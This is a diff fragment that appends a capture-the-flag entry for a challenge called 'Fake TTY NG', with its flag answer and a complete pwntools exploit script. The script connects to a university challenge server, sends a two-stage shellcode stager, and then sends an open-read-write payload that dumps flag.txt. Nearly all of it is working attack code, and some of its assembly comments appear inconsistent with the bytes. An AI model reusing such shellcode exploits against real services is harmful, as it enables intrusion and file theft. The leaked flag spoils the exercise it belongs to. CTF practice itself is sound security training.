@@ -666,3 +666,111 @@ def main() -> int:
 
 if __name__ == "__main__":
     raise SystemExit(main())
+-----------------------------------------------------------------------------------------------
+challenge #Fake TTY NG
+solution: you_ve_conquered_the_master_fatty_challenge_76215102
+hint:  exploit.py:
+#!/usr/bin/env python3
+from pwn import asm, context
+import socket
+import time
+import argparse
+
+context.clear(arch='amd64', os='linux')
+
+def exploit(host='shell.hackintro25.di.uoa.gr', port=55178):
+    # Stage 1 (Non-alphanumeric Shellcode):
+    # 1. push rdx    (ff f2) - buffer ptr
+    # 2. pop rsi     (5e)    - set as dst buffer
+    # 3. sub edi,edi (29 ff) - fd = 0 (stdin)
+    # 4. sub edx,edx (29 d2) - count = 0
+    # 5. mov dl,0x7f (b2 7f) - count = 127
+    # 6. syscall     (0f 05) - sys_read
+    stage1 = bytes.fromhex('fff25e29ff29d2b27f0f05')
+
+    # Stage 2 (ORW: Open, Read, Write flag.txt):
+    orw_asm = r'''
+        /* openat(AT_FDCWD, "flag.txt", O_RDONLY) */
+        xor esi, esi
+        push rsi
+        mov rbx, 0x7478742e67616c66
+        push rbx
+        mov rdi, rsp
+        xor edx, edx
+        mov eax, 257
+        mov r10, -100
+        push r10
+        pop rdi
+        mov rsi, rsp
+        syscall
+
+        /* read(fd, rsp, 0x70) */
+        mov edi, eax
+        mov rsi, rsp
+        mov edx, 0x70
+        xor eax, eax
+        syscall
+
+        /* write(1, rsp, bytes_read) */
+        mov edx, eax
+        mov eax, 1
+        mov edi, 1
+        mov rsi, rsp
+        syscall
+
+        /* exit(0) */
+        mov eax, 60
+        xor edi, edi
+        syscall
+    '''
+    stage2_code = asm(orw_asm)
+    # Pad to ensure stage2 executes smoothly after stage1
+    stage2 = b'\x90' * len(stage1) + stage2_code
+
+    def ru(s, tok, timeout=4):
+        s.settimeout(timeout)
+        d = b''
+        while tok not in d:
+            c = s.recv(1)
+            if not c: break
+            d += c
+        return d
+
+    print(f"[*] Connecting to {host}:{port}...")
+    with socket.create_connection((host, port), timeout=8) as s:
+        print("[*] Waiting for ID prompt...")
+        print(ru(s, b'Enter your ID: ').decode('latin1', 'ignore'), end='')
+        s.sendall(b'AAAA\n')
+        
+        print("[*] Waiting for execution prompt...")
+        print(ru(s, b'What do you want to execute: ').decode('latin1', 'ignore'), end='')
+        
+        print(f"[*] Sending Stage 1 ({len(stage1)} bytes)...")
+        s.sendall(stage1 + b'\n')
+        time.sleep(0.05)
+        
+        print(f"[*] Sending Stage 2 ORW Payload ({len(stage2)} bytes)...")
+        s.sendall(stage2)
+        
+        print("[*] Harvesting output...")
+        s.settimeout(2)
+        out = b''
+        try:
+            while True:
+                x = s.recv(4096)
+                if not x: break
+                out += x
+        except Exception:
+            pass
+        
+        print('\n[+] Output Received:\n' + '='*40)
+        print(out.decode('latin1', 'ignore'))
+        print('='*40)
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='fatty-ng exploit solver')
+    parser.add_argument('--host', default='shell.hackintro25.di.uoa.gr', help='Target host')
+    parser.add_argument('--port', type=int, default=55178, help='Target port')
+    args = parser.parse_args()
+    exploit(args.host, args.port)
+-----------------------------------------------------------------------------------------------
